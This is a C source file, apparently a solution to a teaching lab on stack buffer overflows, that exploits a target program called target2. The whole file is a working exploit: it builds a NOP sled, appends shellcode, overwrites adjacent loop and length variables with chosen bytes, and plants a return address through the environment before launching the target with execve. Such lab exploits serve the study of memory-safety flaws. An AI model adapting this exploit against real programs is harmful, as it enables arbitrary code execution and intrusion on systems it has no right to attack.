#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"
#define NOP_NUM 128
#define BUF_ADDR "\x40\xfd\x21\x20" // Little endian

int
main ( int argc, char * argv[] )
{
	char *	args[3];

	args[0] = TARGET;
        /* \x90 is NOP for intel x86 processor */
	/* &buf: 0x2021fd40 */
	/* &i: 0x2021fe48 */
	/* &len: 0x2021fe4c */
	/* rip at 0x2021fe58 */
        char exploit_str[512];
	memset(exploit_str, '\x90', 512);

        // Padding number of nop at the begging of buffer
        strcpy(exploit_str, nop);
	int i;
        for (i = 0; i < NOP_NUM - 1; i++) {
            strcat(exploit_str, nop);
        }

        // inject the shell code
        strcat(exploit_str, shellcode);

        // Padding the end of str with return address pointing to &buf
        // align the address
        int exlen = strlen(exploit_str);
        int align = (exlen + 1) % 4;
        if (align != 0) {
            for (i = 0; i < align + 1; i++) {
                strcat(exploit_str, nop);
            }
        }
	// padding nops to 0x108(264)
	while (strlen(exploit_str) < 0x108) {
            strcat(exploit_str, nop);
	}
	
	// skip i by writing \x0b to original \x08
	exploit_str[264] = '\x0b';
	
	// overwrite len to 283
	exploit_str[268] = '\x1b';
	exploit_str[269] = '\x01';
	exploit_str[270] = '\x00';

	args[1] = exploit_str;
	args[2] = NULL;
	
	char* env[] = {
	  "", // Pad a '\x00' at 271
	  "dumydumy\x40\xfd\x21\x20", // Pad 8 dummy byte and then the return addr
	  NULL
	};
	
	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
